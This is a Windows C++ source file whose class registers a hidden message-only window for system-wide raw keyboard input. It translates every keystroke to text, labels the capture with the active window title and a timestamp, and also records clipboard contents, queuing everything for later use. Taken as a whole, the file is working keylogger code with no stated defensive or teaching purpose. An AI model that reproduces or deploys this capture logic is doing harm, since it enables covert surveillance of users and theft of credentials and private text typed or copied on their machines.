#include "pch.h"
#include "WinMsgHandler.h"


//Roll out of trying to integrate MFC and simplify this
WinMsgHandler::WinMsgHandler(std::shared_ptr<SharedQueue> queue) : _queue(queue)
{
	WNDCLASS wc{ 0 };
	wc.lpfnWndProc = this->baseHandle;
	wc.hInstance = hInst;
	wc.lpszClassName = L"Form1";

	RegisterClassW(&wc);
	wHandle = CreateWindowW(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInst, this);

}

WinMsgHandler::~WinMsgHandler()
{
	if (wHandle)
		DestroyWindow(wHandle);
}

LRESULT WinMsgHandler::baseHandle(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (WM_NCCREATE == message)
	{
		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)((CREATESTRUCT*)lParam)->lpCreateParams);
		return TRUE;
	}
	return ((WinMsgHandler*)GetWindowLongPtr(hWnd, GWLP_USERDATA))->classHandleMsg(hWnd, message, wParam, lParam);
}

LRESULT WinMsgHandler::classHandleMsg(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	UINT dwSize = 0;
	switch (message) {

	case WM_CREATE: {
		locale = GetKeyboardLayout(0);
		RAWINPUTDEVICE rid{ 0 };
		rid.dwFlags = RIDEV_INPUTSINK;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
		rid.usUsagePage = 1;											// raw keyboard data only
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		caplock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		break;
	}// end case WM_CREATE

	case WM_DESTROY: {
		RAWINPUTDEVICE rid{ 0 };
		rid.dwFlags = RIDEV_REMOVE;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
		rid.usUsagePage = 1;											// raw keyboard data only
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		PostQuitMessage(0);
		break;
	}// end case WM_DESTROY

	case WM_INPUT: {
		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1) {
			PostQuitMessage(0);
			break;
		}

		LPBYTE lpb = new BYTE[dwSize];
		if (lpb == NULL) {
			PostQuitMessage(0);
			break;
		}

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize) {
			delete[] lpb;
			PostQuitMessage(0);
			break;
		}

		PRAWINPUT raw = (PRAWINPUT)lpb;
		UINT Event;

		Event = raw->data.keyboard.Message;
		USHORT legacyVkey = raw->data.keyboard.VKey;
		USHORT ScanKey = raw->data.keyboard.MakeCode;
		//UINT keyChar = MapVirtualKey(raw->data.keyboard.VKey, MAPVK_VK_TO_CHAR);
		delete[] lpb;	// free this now


		switch (Event) {

		case WM_KEYDOWN: {
			if (legacyVkey == VK_SHIFT)
			{
				isShifted = true;
				break;
			}
			else if (legacyVkey == VK_CAPITAL)
			{
				caplock = !caplock;
				break;
			}
			else if (legacyVkey == VK_MENU)
			{
				isAlted = true;
				break;
			}
			else if (legacyVkey == VK_CONTROL)
			{
				isCtrled = true;
				break;
			}
			else
			{
				pushKey(ScanKey, legacyVkey);
				break;
			}
			break;
		}// end WM_KEYDOWN
		case WM_KEYUP: {
			if (legacyVkey == VK_SHIFT)
			{
				isShifted = false;
				break;
			}
			else if (legacyVkey == VK_MENU)
			{
				isAlted = false;
				break;
			}
			else if (legacyVkey == VK_CONTROL)
			{
				isCtrled = false;
				break;
			}
			break;
		}

		default:
			break;
		}//end switch
		break;
	}// end case WM_INPUT
	case WM_CLIPBOARDUPDATE: {
		HandleClipboard();
		break;
	}
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}// end switch
	return 0;
}

void WinMsgHandler::checkFocus(UINT keyChar)
{
	CHAR window_title[256] = "";
	CHAR wt[300] = "";
	SYSTEMTIME curr_time;
	GetLocalTime(&curr_time);

	auto hActiveWindow = GetForegroundWindow();
	GetWindowTextA(hActiveWindow, window_title, 256);

	//Insert reference to the current window
	if ((hActiveWindow != hPrevWind)) {

		snprintf(wt, 299, "\r\n%d-%d-%d %d:%d [ %s ]\r\n", curr_time.wYear, curr_time.wMonth,
			curr_time.wDay, curr_time.wHour, curr_time.wMinute, window_title);

		_queue->Push(std::string(wt));
		hPrevWind = hActiveWindow;
	}
}

LRESULT WinMsgHandler::HandleClipboard()
{
	if (IsClipboardFormatAvailable(CF_UNICODETEXT)) //System should convert between different text types automatically
	{
		if (!OpenClipboard(wHandle))
			return 0;
		auto hglb = GetClipboardData(CF_UNICODETEXT);
		if (hglb != nullptr)
		{
			auto str = (wchar_t*)GlobalLock(hglb);
			if (str)
			{
				checkFocus(0);
				_queue->Push(std::wstring(L"\r\n------[COPY START]----\r\n"));
				_queue->Push(std::wstring(str));
				_queue->Push(std::wstring(L"\r\n------[COPY END]----\r\n"));
			}
			GlobalUnlock(hglb);
		}
		CloseClipboard();
	}

	return 0;
}

void WinMsgHandler::pushKey(USHORT scanCode, USHORT vkey)
{
	auto s = std::wstring();
	unsigned char legacyVkey = vkey & 0xFF;


	// handle backspaces
	switch (legacyVkey)
	{
	case VK_BACK:
		s = L"[bs]";
		break;
	case VK_TAB:
		s = L"[TAB]";
		break;
	case VK_RETURN:
		s = L"[enter]\r\n";
		break;
	case VK_SPACE:
		s = L" ";
		break;
	case VK_PRIOR:
		s = L"[page up]";
		break;
	case VK_NEXT:
		s = L"[page down]";
		break;
	case VK_END:
		s = L"[END]";
		break;
	case VK_HOME:
		s = L"[HOME]";
		break;
	case VK_LEFT:
		s = L"[←]";
		break;
	case VK_UP:
		s = L"[↑]";
		break;
	case VK_RIGHT:
		s = L"[→]";
		break;
	case VK_DOWN:
		s = L"[↓]";
		break;
	case VK_DELETE:
		s = L"[delete]";
		break;
	case VK_F1:
	case VK_F2:
	case VK_F3:
	case VK_F4:
	case VK_F5:
	case VK_F6:
	case VK_F7:
	case VK_F8:
	case VK_F9:
	case VK_F10:
	case VK_F11:
	case VK_F12:
	case VK_F13:
	case VK_F14:
	case VK_F15:
	case VK_F16:
	{
		s = L"[F";
		wchar_t num[3]{ 0 };
		_ltow_s(legacyVkey - VK_F1 + 1, num, 3, 10);
		s.append(num);
		s.append(L"]");
		break;
	}
	default:
	{
		wchar_t result[16]{ 0 };
		unsigned char keyboardState[256]{ 0 };
		keyboardState[VK_SHIFT] = (isShifted) ? 0xff : 0;
		keyboardState[VK_CONTROL] = (isCtrled) ? 0xff : 0;
		keyboardState[VK_MENU] = (isAlted) ? 0xff : 0;
		keyboardState[legacyVkey] = 0xff;
		auto retval = ToUnicodeEx(vkey, scanCode, keyboardState, result, 15, 0, locale);
		if (retval > 0)
		{
			result[0] = (caplock == isShifted) ?  ::towlower(result[0]) : ::toupper(result[0]);
			s = result;
		}
	}
	}

	if (s.length() > 0)
	{
		checkFocus(0);
		_queue->Push(std::move(s));
	}
	return;

}